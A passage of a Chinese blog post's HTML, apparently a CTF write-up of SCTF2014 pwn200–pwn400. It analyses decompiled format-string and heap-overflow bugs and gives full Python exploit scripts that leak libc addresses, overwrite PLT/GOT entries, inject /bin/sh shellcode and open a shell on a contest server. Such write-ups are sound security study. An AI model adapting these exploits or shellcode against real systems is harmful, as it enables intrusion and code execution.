class="number">0x0</span>)</span><br><span class="line">payload1 += lib\_main\_plt</span><br><span class="line">payload1 += l32(<span class="number">0x08</span>) </span><br><span class="line"></span><br><span class="line">\<span class="comment"># lib_main(system)</span></span><br><span class="line">payload1 += lib\_main\_got</span><br><span class="line">payload1 += <span class="string">'1111'</span></span><br><span class="line">payload1 += l32(<span class="number">0x0804985C</span>+<span class="number">0x4</span>)</span><br><span class="line">\<span class="comment"># print len(payload1)</span></span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'input name:'</span>)</span><br><span class="line">io.write(payload0)</span><br><span class="line">io.read_until(<span class="string">'input slogan:'</span>)</span><br><span class="line">io.write(payload1)</span><br><span class="line"></span><br><span class="line">buf = io.sock.recv(<span class="number">1024</span>)</span><br><span class="line">lib\_main\_add = struct.unpack(<span class="string">'&lt;I'</span>,buf\[<span class="number">-4</span>:\])\[<span class="number">0</span>\]</span><br><span class="line">system\_add = lib\_main_add + <span class="number">0x26050</span></span><br><span class="line"><span class="keyword">print</span> hex(lib\_main\_add)</span><br><span class="line">\<span class="comment"># io.gdb_hint()</span></span><br><span class="line">payload2 = l32(system_add)</span><br><span class="line">payload2 += <span class="string">'shx00x00'</span></span><br><span class="line"></span><br><span class="line">io.write(payload2+<span class="string">'n'</span>)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<p>flag SCTF{SH3NG_4_KAN_DAN__BU_FU_9_GANN}</p>
+<h1 id="PWN300"><a href="#PWN300" class="headerlink" title="PWN300"></a>PWN300</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn300: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE</span><br><span class="line">No RELRO        Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   pwn300</span><br></pre></td></tr></table></figure>
+<p>题目也提供了glibc，而且pwn200进去以后发现三题都在一个服务器上。所以目测利用方法应该相似。</p>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在第三个功能显示message发现一个格式化溢出漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> \_\_cdecl fun3\_sub_80487FA()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// \[sp+1Ch\] \[bp-40Ch\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// \[sp+41Ch\] \[bp-Ch\]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = *MK\_FP(\_\_GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;dest, src);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your message is:"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(src);                                  <span class="comment">// exploit</span></span><br><span class="line">  result = *MK\_FP(\_\_GS__, <span class="number">20</span>) ^ v2;</span><br><span class="line">  <span class="keyword">if</span> ( *MK\_FP(\_\_GS__, <span class="number">20</span>) != v2 )</span><br><span class="line">    \_\_stack\_chk_fail();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而且之前还很配合的把src的内容复制到栈里。。。这样就有机会对任意地址进行修改</p>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用格式化溢出漏洞可以对内存读取写入，所以可以利用pwn200的利用方式：读取PLT中__libc_main_start的地址，通过libc.so计算system的地址写入程序之后可能会用到的函数的GOT 通过调试发现输入buf的起点位于printf调用的第七个变量 读取.plt __libc_main_start的payload ‘x28x91x04x08%7$sn’ 接下来找一个接下来可能调用到的函数修改其PLT为system函数的地址。这个函数最好可以把“sh”作为参数放进去。于是我选择了memset函数 他在第二个功能中被用到，而且正好把src当参数调用，这样我们通过留言功能让src为”sh”就能调用system(“sh”)了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> \_\_cdecl fun2\_sub_80487B6()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your message"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(src, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">return</span> readbuf\_sub\_804866D((<span class="keyword">int</span>)src, <span class="number">1024</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>下面是exploit，修改地址的时候利用了libformatstr库</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">SCTF2014 pwn300 exploit</span></span><br><span class="line"><span class="string">yuf4n</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">\<span class="comment"># io = zio('./pwn300',print_write=COLORED(REPR))</span></span><br><span class="line">io = zio((<span class="string">'218.2.197.248'</span>,<span class="number">10002</span>),print_write=COLORED(REPR))</span><br><span class="line"></span><br><span class="line">memset\_plt\_addr = <span class="number">0x08049130</span></span><br><span class="line">p = FormatStr()</span><br><span class="line">payload\_leak\_lib_main = <span class="string">'x28x91x04x08%7$sn'</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># read \_\_lib\_main_start plt</span></span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.write(<span class="string">'2n'</span>)</span><br><span class="line">io.read_until(<span class="string">'your message'</span>)</span><br><span class="line">io.write(payload\_leak\_lib_main)</span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.write(<span class="string">'3n'</span>)</span><br><span class="line">io.read_until(<span class="string">'message is:'</span>)</span><br><span class="line">buf = io.read(<span class="number">8</span>)</span><br><span class="line">buf = buf\[<span class="number">-4</span>:\]</span><br><span class="line">systemaddr = struct.unpack(<span class="string">'&lt;I'</span>,buf)\[<span class="number">0</span>\] + <span class="number">0x26050</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'SYSADDR'</span>,hex(systemaddr)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># write  memset_plt</span></span><br><span class="line">p\[memset\_plt\_addr\] = systemaddr</span><br><span class="line">payload = p.payload(<span class="number">7</span>, start_len=<span class="number">0</span>) + <span class="string">'n'</span></span><br><span class="line">\<span class="comment"># io.gdb_hint()</span></span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.write(<span class="string">'2n'</span>)</span><br><span class="line">io.read_until(<span class="string">'your message'</span>)</span><br><span class="line">io.write(payload)</span><br><span class="line">io.write(<span class="string">'3n'</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># set src=sh and call memset</span></span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.write(<span class="string">'2n'</span>)</span><br><span class="line">io.read_until(<span class="string">'message'</span>)</span><br><span class="line">io.write(<span class="string">'shn'</span>)</span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.write(<span class="string">'2n'</span>)</span><br><span class="line">io.read_until(<span class="string">'message'</span>)</span><br><span class="line">io.write(<span class="string">'shn'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<p>flag SCTF{ZQzq2617}</p>
+<h1 id="PWN400"><a href="#PWN400" class="headerlink" title="PWN400"></a>PWN400</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn400: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE</span><br><span class="line">No RELRO        Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   pwn400</span><br></pre></td></tr></table></figure>
+<p>这个NX都没有。</p>
+<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>程序是一个类似便签的功能。 每个note是用malloc申请的，用双向链表链接起来，目测是某个同学的C语言小作业吧。。 3号功能可以显示note空间的的首地址。 在4号功能修改note的功能发现一个堆溢出的漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> \_\_cdecl fun4\_sub_8048D09(<span class="keyword">int</span> a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@8</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// \[sp+28h\] \[bp-410h\]@1</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// \[sp+2Ch\] \[bp-40Ch\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// \[sp+42Ch\] \[bp-Ch\]@1</span></span><br><span class="line"></span><br><span class="line">  v5 = *MK\_FP(\_\_GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">  v3 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"note title:"</span>, <span class="number">0xB</span>u);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="keyword">while</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="built_in">strlen</span>(&amp;buf);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;buf, (<span class="keyword">const</span> <span class="keyword">char</span> *)(v3 + <span class="number">12</span>), v1) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = *(_DWORD *)(v3 + <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"input content:"</span>, <span class="number">0xE</span>u);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)(v3 + <span class="number">108</span>), &amp;buf);           <span class="comment">// exploit</span></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"succeed!"</span>, <span class="number">8u</span>);</span><br><span class="line">    <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)(v3 + <span class="number">108</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"no notes"</span>, <span class="number">8u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = *MK\_FP(\_\_GS__, <span class="number">20</span>) ^ v5;</span><br><span class="line">  <span class="keyword">if</span> ( *MK\_FP(\_\_GS__, <span class="number">20</span>) != v5 )</span><br><span class="line">    \_\_stack\_chk_fail();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在5号功能删除note的功能发现一个类似dwrod shoot的漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> \_\_cdecl sub\_8048E99(<span class="keyword">int</span> a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST28_4@8</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST2C_4@8</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@10</span></span><br><span class="line">  __int32 ptr; <span class="comment">// \[sp+24h\] \[bp-24h\]@3</span></span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// \[sp+32h\] \[bp-16h\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// \[sp+36h\] \[bp-12h\]@1</span></span><br><span class="line">  __int16 v7; <span class="comment">// \[sp+3Ah\] \[bp-Eh\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// \[sp+3Ch\] \[bp-Ch\]@1</span></span><br><span class="line"></span><br><span class="line">  v8 = *MK\_FP(\_\_GS__, <span class="number">20</span>);</span><br><span class="line">  buf = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"note location:"</span>, <span class="number">0xE</span>u);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">    ptr = strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)ptr == ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)a1 == ptr )</span><br><span class="line">      &#123;</span><br><span class="line">        *(\_DWORD *)a1 = *(\_DWORD *)(*(_DWORD *)a1 + <span class="number">8</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)(ptr + <span class="number">8</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v1 = *(_DWORD *)(ptr + <span class="number">8</span>);</span><br><span class="line">          v2 = *(_DWORD *)(ptr + <span class="number">4</span>);</span><br><span class="line">          *(_DWORD *)(v2 + <span class="number">8</span>) = v1;             <span class="comment">// dword shoot</span></span><br><span class="line">          *(_DWORD *)(v1 + <span class="number">4</span>) = v2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          *(\_DWORD *)(*(\_DWORD *)(ptr + <span class="number">4</span>) + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">"succeed!nn"</span>, <span class="number">0xA</span>u);</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"no notes"</span>, <span class="number">8u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = *MK\_FP(\_\_GS__, <span class="number">20</span>) ^ v8;</span><br><span class="line">  <span class="keyword">if</span> ( *MK\_FP(\_\_GS__, <span class="number">20</span>) != v8 )</span><br><span class="line">    \_\_stack\_chk_fail();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>例如ptr = &amp;note (note空间的基地址) 则可以进行 [ [ptr+4]+8 ] = [prt+8] [ [ptr+8]+4 ] = [ptr+4]</p>
+<h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>思路是通过堆溢出漏洞可以覆盖到另外一个note的ptr+4 和 ptr+8。 之后利用这个dword shoot修改即将要调用的函数的plt到shellcode处。 shellcode前面要加一些nop，因为dword shoot的副作用会修改到shellcode。 具体操作：</p>
+<ol>
+<li>新建3个note，我把shellcode放在第三个note的content里</li>
+<li>查看他们的地址</li>
+<li>溢出第一个note</li>
+<li>删除第二个note，通过dword shoot修改write函数的plt为shellcode位置（有试过修改其他函数的，发现修改write可以成功。）</li>
+<li>程序在dword shoot之后就有一个write调用，即进入shellcode</li>
+</ol>
+<p>exploit如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">SCTF2014 pwn400 exploit</span></span><br><span class="line"><span class="string">yuf4n</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">\<span class="comment"># io = zio('./pwn400', print_write=COLORED(REPR), timeout=80000)</span></span><br><span class="line">io = zio((<span class="string">'218.2.197.248'</span>,<span class="number">10003</span>),print_write=COLORED(REPR))</span><br><span class="line">exit_plt = <span class="number">0x0804A46C</span></span><br><span class="line">free_plt =<span class="number">0x0804A450</span></span><br><span class="line">write_plt =<span class="number">0x0804A478</span></span><br><span class="line">shellcode = <span class="string">"x90"</span>*<span class="number">16</span>+<span class="string">"x31xc9xf7xe1xb0x0bx51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"</span></span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">io.write(<span class="string">'1n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note title:'</span>)</span><br><span class="line">io.write(<span class="string">'1n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note type:'</span>)</span><br><span class="line">io.write(<span class="string">'1n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note content:'</span>)</span><br><span class="line">io.write(<span class="string">'1n'</span>)</span><br><span class="line">io.read_until(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">io.write(<span class="string">'1n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note title:'</span>)</span><br><span class="line">io.write(<span class="string">'2n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note type:'</span>)</span><br><span class="line">io.write(<span class="string">'2n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note content:'</span>)</span><br><span class="line">io.write(<span class="string">'2n'</span>)</span><br><span class="line">io.read_until(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">io.write(<span class="string">'1n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note title:'</span>)</span><br><span class="line">io.write(<span class="string">'3n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note type:'</span>)</span><br><span class="line">io.write(<span class="string">'3n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note content:'</span>)</span><br><span class="line">io.write(shellcode+<span class="string">'n'</span>)</span><br><span class="line">io.read_until(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">io.write(<span class="string">'3n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note title:'</span>)</span><br><span class="line">io.write(<span class="string">'3n'</span>)</span><br><span class="line">buf = io.read_until(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">addr_3 = buf\[buf.find(<span class="string">'location:0x'</span>)+len(<span class="string">'location:0x'</span>):buf.find(<span class="string">'location:0x'</span>)+len(<span class="string">'location:0x'</span>)+<span class="number">8</span>\]</span><br><span class="line"></span><br><span class="line">io.write(<span class="string">'3n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note title:'</span>)</span><br><span class="line">io.write(<span class="string">'2n'</span>)</span><br><span class="line">buf = io.read_until(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">addr_2 = buf\[buf.find(<span class="string">'location:0x'</span>)+len(<span class="string">'location:0x'</span>):buf.find(<span class="string">'location:0x'</span>)+len(<span class="string">'location:0x'</span>)+<span class="number">8</span>\]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'1'</span>*<span class="number">0x100</span></span><br><span class="line">payload += <span class="string">'2222'</span></span><br><span class="line">\<span class="comment"># addr2</span></span><br><span class="line">payload += l32(int(addr_2,<span class="number">16</span>))</span><br><span class="line">\<span class="comment"># ptr+4</span></span><br><span class="line">payload += l32(write_plt<span class="number">-0x8</span>)</span><br><span class="line">\<span class="comment"># ptr+8</span></span><br><span class="line">payload += l32(int(addr_3,<span class="number">16</span>)+<span class="number">108</span>)</span><br><span class="line">payload += <span class="string">'efghijklmn'</span></span><br><span class="line"></span><br><span class="line">io.write(<span class="string">'4n'</span>)</span><br><span class="line">io.read_until(<span class="string">'title:'</span>)</span><br><span class="line">io.write(<span class="string">'1n'</span>)</span><br><span class="line">io.read_until(<span class="string">'content:'</span>)</span><br><span class="line">io.write(payload+<span class="string">'n'</span>)</span><br><span class="line">io.read_until(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">io.write(<span class="string">'5n'</span>)</span><br><span class="line">\<span class="comment"># io.gdb_hint()</span></span><br><span class="line">io.read_until(<span class="string">'location:'</span>)</span><br><span class="line">io.write(addr_2+<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<p>flag SCTF{2318540E78446A0E84EF69685092F0C3}</p>
+
+            
+
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">TAGGED IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/sctf/">sctf</a> <a class="tag tag--primary tag--small t-link" href="/tags/writeup/">writeup</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/writeups/hctf2014final-qoobee-writeup/"
+                    data-tooltip="HCTF2014 FINAL 之pwn题qoobee1-6 writeup"
+                    aria-label="PREVIOUS: HCTF2014 FINAL 之pwn题qoobee1-6 writeup"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/writeups/hitcon-ctf-2014-rsbo-finger-rsaha-writeup/"
+                    data-tooltip="HITCON CTF 2014 rsbo,finger,rsaha writeup"
+                    aria-label="NEXT: HITCON CTF 2014 rsbo,finger,rsaha writeup"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.eadom.net/writeups/sctf2014-pwn-writeups/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.eadom.net/writeups/sctf2014-pwn-writeups/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=https://blog.eadom.net/writeups/sctf2014-pwn-writeups/"
+                    title="Share on Google+"
+                    aria-label="Share on Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
+            
